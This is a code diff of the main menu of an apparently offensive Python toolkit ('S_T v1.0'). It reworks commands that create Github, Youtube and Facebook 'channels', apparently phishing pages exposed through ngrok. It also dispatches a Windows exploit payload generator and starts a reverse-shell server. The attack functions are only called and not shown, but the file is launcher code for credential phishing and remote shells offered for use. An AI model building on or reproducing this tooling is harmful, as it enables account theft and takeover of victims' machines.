@@ -2,10 +2,11 @@
 #S_T v1.0
 #cheking the modules 
 from templets.module_cheeke.module import modules_check , ngrok_check
-
-#checking if user have ben install ngrok
+'''checking the modules'''
+modules_check()
+'''checking if user have ben install ngrok'''
 #ngrok_check()
-#importing the needing modules
+'''importing the needing modules'''
 
 import os, sys, time
 from templets.banner.banner import *
@@ -24,8 +25,6 @@ none = "\033[0m"
 
 def S_T():
     os.system("clear")
-    '''checking the modules'''
-    modules_check()
     print(f"{c}  [{g}   OK   {c}] {g} all the module are founds")
     os.system("clear")
     time.sleep(2)
@@ -46,38 +45,20 @@ def S_T():
         elif op_intarface == "help":
             help_menu()
         #checking teh cre_channel options Github
-        elif op_intarface == "cre_channel -c Github -o Termux":
+        elif op_intarface == "cre_channel -c Github":
             channel.github_T_L()
-        elif op_intarface == "cre_channel -c Github -o Linux":
-            channel.github_T_L()
-        elif op_intarface == "cre_channel -c Github -o Windows":
-            channel.github_W_M()
-        elif op_intarface == "cre_channel -c Github -o Mac":
-            channel.github_W_M()
         #checking teh cre_channel options Youtube
-        elif op_intarface == "cre_channel -c Youtube -o Termux":
+        elif op_intarface == "cre_channel -c Youtube":
             channel.youtube_T_L()
-        elif op_intarface == "cre_channel -c Youtube -o Linux":
-            channel.youtube_T_L()
-        elif op_intarface == "cre_channel -c Youtube -o Windows":
-            channel.youtube_W_M()
-        elif op_intarface == "cre_channel -c Youtube -o Mac":
-            channel.youtube_W_M()
         #checking the cre_channel options Facebook
-        elif op_intarface == "cre_channel -c Facebook -o Termux":
+        elif op_intarface == "cre_channel -c Facebook":
             channel.facebook_T_L()
-        elif op_intarface == "cre_channel -c Facebook -o Linux":
-            channel.facebook_T_L()
-        elif op_intarface == "cre_channel -c Facebook -o Windows":
-            channel.facebook_W_M()
-        elif op_intarface == "cre_channel -c Facebook -o Mac":
-            channel.facebook_W_M()
         #check the status of the user
         elif op_intarface == "get status":
             status()
         #check for update
         elif op_intarface == "update":
-            git_repo()
+            update()
         #the usage command
         elif op_intarface == "usage get status":
             usage.usage_get_status()
@@ -96,7 +77,8 @@ def S_T():
             exploit_payload.exploit_payload_Windows()
         #start a server option
         elif op_intarface == "start server":
-            reverse_shell_exec()
+            if status() == True:
+                reverse_shell_exec()
         else :
             print(f"  {c}[{r}-{c}]{r}  command not found : {y}{op_intarface}")
 if __name__ == "__main__":
